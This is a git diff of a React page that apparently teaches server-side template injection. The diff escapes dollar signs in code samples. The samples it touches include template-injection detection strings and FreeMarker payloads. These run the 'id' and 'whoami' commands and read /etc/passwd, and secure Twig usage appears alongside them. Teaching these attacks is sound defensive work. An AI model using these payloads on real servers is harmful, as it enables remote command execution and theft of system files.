@@ -31,10 +31,10 @@ const SSTI: React.FC = () => {
         title="Basic Detection Payloads" 
         code={`# Mathematical expressions (template-agnostic)
 {{7*7}}
-${7*7}
+\${7*7}
 #{7*7}
 %{7*7}
-${{7*7}}
+\${{7*7}}
 
 # If you see "49" in the response, SSTI is likely present
 
@@ -42,10 +42,10 @@ ${{7*7}}
 {{7*'7'}}  # Should return "7777777" in Jinja2/Twig
 
 # FreeMarker detection
-${7*7}     # Should return "49" in FreeMarker
+\${7*7}     # Should return "49" in FreeMarker
 
 # Velocity detection  
-#set($x=7*7)$x  # Should return "49" in Velocity
+#set(\$x=7*7)\$x  # Should return "49" in Velocity
 
 # Smarty detection
 {7*7}      # Should return "49" in Smarty`} 
@@ -98,16 +98,16 @@ ${7*7}     # Should return "49" in FreeMarker
         isVulnerable={true}
         title="FreeMarker SSTI Exploitation" 
         code={`# FreeMarker command execution
-<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+<#assign ex="freemarker.template.utility.Execute"?new()> \${ ex("id") }
 
 # Alternative FreeMarker payload
-${"freemarker.template.utility.Execute"?new()("whoami")}
+\${"freemarker.template.utility.Execute"?new()("whoami")}
 
 # File read in FreeMarker
 <#assign file=object?api.class.forName("java.io.File")?constructor?api("/etc/passwd")?new()>
 <#assign scanner=object?api.class.forName("java.util.Scanner")?constructor?api(file)?new()>
 <#assign content=scanner.nextLine()>
-${content}`} 
+\${content}`} 
       />
       
       <CodeExample 
@@ -134,11 +134,11 @@ const template = Handlebars.compile('Hello {{username}}!');
 const result = template({ username: userInput });
 
 // Secure Twig usage (PHP)
-$loader = new \Twig\Loader\ArrayLoader(['template' => 'Hello {{ username }}!']);
-$twig = new \Twig\Environment($loader);
+\$loader = new \\Twig\\Loader\\ArrayLoader(['template' => 'Hello {{ username }}!']);
+\$twig = new \\Twig\\Environment(\$loader);
 
 // SECURE: Pass data as context, not in template
-echo $twig->render('template', ['username' => htmlspecialchars($userInput)]);
+echo \$twig->render('template', ['username' => htmlspecialchars(\$userInput)]);
 
 // General secure practices:
 // 1. Use logic-less templates when possible
